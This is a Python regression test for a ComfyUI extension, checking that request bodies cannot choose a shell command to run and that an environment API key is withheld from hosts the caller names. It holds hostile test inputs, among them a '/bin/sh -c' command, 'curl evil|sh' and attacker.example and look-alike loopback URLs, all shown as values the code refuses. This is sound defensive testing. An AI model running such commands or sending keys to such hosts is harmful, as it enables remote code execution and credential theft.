"""Run: python3 tests/test_untrusted_input.py

These routes ride on ComfyUI's own HTTP server, which has no authentication,
and a workflow is a file people share. So the request body and the saved widget
are both untrusted input. Two things in it used to be trusted anyway:

  cli_command  → subprocess.run(shlex.split(...)). A POST naming `/bin/sh -c …`
                 ran as the ComfyUI user. shell=False does not help when the
                 caller picks the interpreter.
  base_url     → the target of a request carrying $OPENAI_API_KEY from the
                 ComfyUI process environment, whose reply body was handed back
                 to the caller — a key leak and an SSRF read primitive.

Both are closed here. These assertions are the reason they stay closed.
"""
import importlib.util
import os
import pathlib
import sys

P = pathlib.Path(__file__).resolve().parent.parent
sp = importlib.util.spec_from_file_location("h3s", P / "__init__.py", submodule_search_locations=[str(P)])
m = importlib.util.module_from_spec(sp); sys.modules["h3s"] = m; sp.loader.exec_module(m)
L = importlib.import_module("h3s.llm_backends")

passed, fails = 0, []


def ok(n, c, d=""):
    global passed
    if c:
        passed += 1
    else:
        fails.append(f"{n}{chr(10) + '      ' + str(d) if d else ''}")


def eq(n, a, b):
    ok(n, a == b, f"expected {b!r}, got {a!r}")


def raises(n, fn):
    try:
        fn()
    except L.LLMError:
        ok(n, True)
        return
    except Exception as exc:  # noqa: BLE001
        ok(n, False, f"raised {type(exc).__name__}, wanted LLMError: {exc}")
        return
    ok(n, False, "did not raise")


# --- no command from the caller ---------------------------------------------
os.environ.pop(L.CLI_COMMAND_ENV, None)

raises("cli: a command in the request body is refused outright",
       lambda: L.resolve_cli_command("custom_cli", "/bin/sh -c 'id > /tmp/pwned'"))
raises("cli: refused even when it looks harmless",
       lambda: L.resolve_cli_command("custom_cli", "echo hi"))
raises("cli: resolve_backend refuses it on the path the route actually takes",
       lambda: L.resolve_backend("custom_cli", "", "", "/bin/sh -c id"))
try:
    L.resolve_cli_command("custom_cli", "")
except L.LLMError as exc:
    ok("cli: the refusal names the env var that does work", L.CLI_COMMAND_ENV in str(exc), str(exc)[:120])
    ok("cli: and does not echo the rejected command when none was sent", "None" not in str(exc))

# The three presets are commands the user installed and picked by name, so they
# keep working with no configuration — the body simply cannot change them.
eq("cli: claude preset still runs", L.resolve_cli_command("claude_cli"), "claude -p --output-format text")
eq("cli: a body cannot override a preset",
   L.resolve_cli_command("claude_cli", "/bin/sh -c id"), "claude -p --output-format text")
eq("cli: gemini preset", L.resolve_cli_command("gemini_cli"), "gemini -p")
eq("cli: codex preset", L.resolve_cli_command("codex_cli"), "codex exec")
eq("cli: resolve_backend returns the preset, not the body",
   L.resolve_backend("codex_cli", "", "", "/bin/sh -c id")[3], "codex exec")

# The machine owner keeps an escape hatch, but it takes shell access to set.
os.environ[L.CLI_COMMAND_ENV] = "my-runner --stdin"
eq("cli: $H3_CLI_COMMAND is honoured", L.resolve_cli_command("custom_cli", "/bin/sh -c id"), "my-runner --stdin")
eq("cli: and still cannot be overridden by the body",
   L.resolve_cli_command("custom_cli", "curl evil|sh"), "my-runner --stdin")
os.environ.pop(L.CLI_COMMAND_ENV, None)

# --- no environment key to a host the caller named --------------------------
for var in ("OPENAI_API_KEY", "OPENROUTER_API_KEY", "GEMINI_API_KEY", "H3_LLM_API_KEY"):
    os.environ.pop(var, None)
os.environ.pop(L.HOST_ALLOWLIST_ENV, None)
os.environ["OPENAI_API_KEY"] = "sk-the-users-real-key"

eq("key: withheld from a host named in the request body",
   L.resolve_api_key("", "http://attacker.example/v1"), "")
eq("key: withheld from a LAN address too",
   L.resolve_api_key("", "http://192.168.1.50:1234/v1"), "")
eq("key: withheld from an address that merely looks local",
   L.resolve_api_key("", "http://127.0.0.1.evil.example/v1"), "")
eq("key: travels to loopback, where the user's own server lives",
   L.resolve_api_key("", "http://127.0.0.1:1234/v1"), "sk-the-users-real-key")
eq("key: localhost by name counts as loopback",
   L.resolve_api_key("", "http://localhost:11434/v1"), "sk-the-users-real-key")
eq("key: a key typed into the dialog is the user's own choice and always travels",
   L.resolve_api_key("sk-typed", "http://attacker.example/v1"), "sk-typed")
eq("key: a typed key beats the environment",
   L.resolve_api_key("sk-typed", "http://127.0.0.1:1234/v1"), "sk-typed")

os.environ[L.HOST_ALLOWLIST_ENV] = "api.openai.com, openrouter.ai"
eq("key: an allowlisted host set by the machine owner is allowed",
   L.resolve_api_key("", "https://api.openai.com/v1"), "sk-the-users-real-key")
eq("key: a host not on the list is still refused",
   L.resolve_api_key("", "https://api.openai.com.evil.example/v1"), "")
os.environ.pop(L.HOST_ALLOWLIST_ENV, None)
os.environ.pop("OPENAI_API_KEY", None)

# --- loopback detection is what both guards hang on -------------------------
for url, want in (
    ("http://127.0.0.1:1234/v1", True), ("http://localhost/v1", True),
    ("http://[::1]:8080/v1", True), ("http://0.0.0.0:1234/v1", True),
    ("http://192.168.1.7/v1", False), ("https://api.openai.com/v1", False),
    ("http://127.0.0.1.evil.example/v1", False), ("not a url at all", False),
    ("", False),
):
    eq(f"local: {url or '(empty)'} → {want}", L.is_local_target(url), want)

if fails:
    print(f"\n✗ {len(fails)} failed, {passed} passed\n")
    for f in fails:
        print("  - " + f)
    sys.exit(1)
print(f"✓ {passed} passed, 0 failed")
